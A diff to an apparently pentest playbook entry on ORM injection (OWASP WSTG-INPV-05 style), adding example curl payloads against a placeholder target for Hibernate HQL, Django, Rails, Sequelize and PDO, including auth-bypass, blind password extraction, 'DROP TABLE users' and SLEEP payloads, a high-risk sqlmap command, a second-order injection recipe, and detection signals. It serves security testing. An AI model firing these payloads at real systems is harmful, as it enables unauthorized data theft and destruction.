@@ -8,9 +8,10 @@ author: cyberstrike-official
 tags: [injection, input-validation, xss, sqli, wstg, inpv]
 tech_stack: []
 cwe_ids: []
-chains_with: []
-prerequisites: []
-severity_boost: {}
+chains_with: [wstg-inpv-01, wstg-inpv-02]
+prerequisites: [wstg-conf-01, wstg-conf-02]
+severity_boost:
+  wstg-inpv-02: "ORM Injection (e.g. HQL/JPQL) grants write access to persisted entities, allowing an unsanitized script payload to be stored in a field rendered elsewhere, achieving persistent Stored XSS against every user who views the record = Critical (Mass Account Compromise)"
 ---
 
 # wstg-inpv-05.7
@@ -322,6 +323,96 @@ sort=name DESC; SELECT * FROM users;--
 
 ---
 
+## Example Commands/Payloads
+
+### HQL/JPQL Injection (Hibernate/JPA)
+
+```bash
+TARGET="https://target.com/search"
+
+# Auth bypass style payload against a raw HQL query
+curl -s -X POST "$TARGET" -d "username=' OR '1'='1"
+curl -s -X POST "$TARGET" -d "username=' OR ''='"
+
+# Blind boolean extraction
+curl -s -X POST "$TARGET" -d "username=admin' AND (SELECT COUNT(*) FROM User)>0 AND ''='"
+curl -s -X POST "$TARGET" -d "username=admin' AND substring(password,1,1)='a' AND ''='"
+```
+
+### Django ORM Injection
+
+```bash
+# extra() / raw() misuse - classic string-formatted WHERE clause
+curl -s "https://target.com/api/users?name=x' OR '1'='1"
+
+# QuerySet kwargs injection via user-controlled filter dict (?filter={"id__gt":0})
+curl -s "https://target.com/api/users?filter=%7B%22id__gt%22%3A0%7D"
+
+# Order-by field injection (if sort param maps directly to .order_by())
+curl -s "https://target.com/api/users?sort=-password"
+```
+
+### Rails ActiveRecord Injection
+
+```bash
+# String-interpolated where() clause
+curl -s "https://target.com/users?name=x');DROP TABLE users;--"
+
+# order() injection (unsafe raw SQL fragment)
+curl -s "https://target.com/users?sort=name;SELECT SLEEP(5)--"
+```
+
+### SQLMap Against ORM-backed Endpoints
+
+```bash
+# Works when the ORM ultimately builds raw/interpolated SQL under the hood
+sqlmap -u "https://target.com/search?username=test" --batch --level=5 --risk=3
+```
+
+### Node.js Sequelize/Knex Injection (raw/literal escape hatches)
+
+```bash
+# Sequelize sequelize.literal() or Op.gt with unsanitized user object reaching the query
+curl -s -X POST "https://target.com/api/search" -H "Content-Type: application/json" \
+    -d '{"name":{"[Op.or]":[1,"1); DROP TABLE users;--"]}}'
+
+# Sort/order column passed straight into .order([[userInput,'ASC']]) (no allowlist)
+curl -s "https://target.com/api/users?sort=(SELECT SLEEP(5))"
+```
+
+### PDO Bound-Parameter Smuggling (applies to ORMs that mix raw column names with bound values)
+
+Even when values are correctly bound with `?`/`:param`, an ORM/query-builder that lets user input choose a *column or table name* (a common "sortable/filterable column" feature) can still be injected — see the full PDO technique in `wstg-inpv-05` References. Minimal reproduction against a raw PDO statement built the same way an ORM's `orderBy($userField)` helper would:
+
+```text
+GET /index.php?col=%3f%23%00&name=x%60;%23
+# 1st payload breaks out of the bound placeholder context via a smuggled `?`/`:` before null-byte truncation
+# 2nd payload backtick-closes the injected column identifier and comments out the rest
+```
+
+### Second-Order Injection Through a Stored Entity
+
+```text
+1. Create/update an ORM-managed entity with a payload inert at write time:
+     user.username = "attacker' OR '1'='1"      # saved via parameterized INSERT, no injection fires
+2. A DIFFERENT code path later builds a raw/HQL query using that entity's
+   field directly (e.g. an audit-log search: "FROM Log WHERE actor = '" + user.username + "'")
+3. The stored value now breaks out of the string literal in the second query.
+```
+
+### Detection Pattern
+
+| Signal | Meaning |
+| ------ | ------- |
+| HQL/JPQL error (`QuerySyntaxException`, `could not resolve property`) leaked in response | Raw string concatenation into `createQuery()` — confirmed HQL injection point |
+| Django `FieldError` / `Cannot resolve keyword` in response when sending an unexpected `filter` key | User-controlled dict reaching `.filter(**dict)` or `.extra(where=...)` |
+| Rails `ActiveRecord::StatementInvalid` / raw SQL fragment reflected in error | Unsafe string interpolation in `.where()`/`.order()` |
+| Response delayed under `sort=name;SELECT SLEEP(5)` | Raw SQL fragment passed unescaped into `ORDER BY`, stacked execution possible |
+| Sequelize `SequelizeDatabaseError` / raw SQL fragment in response when `Op.*` keys or `sequelize.literal()` receive unsanitized input | Node.js ORM raw-escape-hatch injection confirmed |
+| A field stored via one ORM entity write later breaks a second, unrelated query | Second-order injection through the ORM's persisted data, not the initial write path |
+
+---
+
 ## Remediation
 
 ```python
@@ -378,6 +469,13 @@ cq.select(root).where(cb.equal(root.get("name"), name));
 | **CWE-89**  | SQL Injection                               |
 | **CWE-943** | Improper Neutralization in Data Query Logic |
 
+---
+
+## References
+
+- [OWASP WSTG - Testing for SQL Injection (WSTG-INPV-05)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
+- [PayloadsAllTheThings - SQL Injection (ORM)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
+- [Hibernate HQL Injection - PortSwigger](https://portswigger.net/web-security/sql-injection)
 
 ---
 
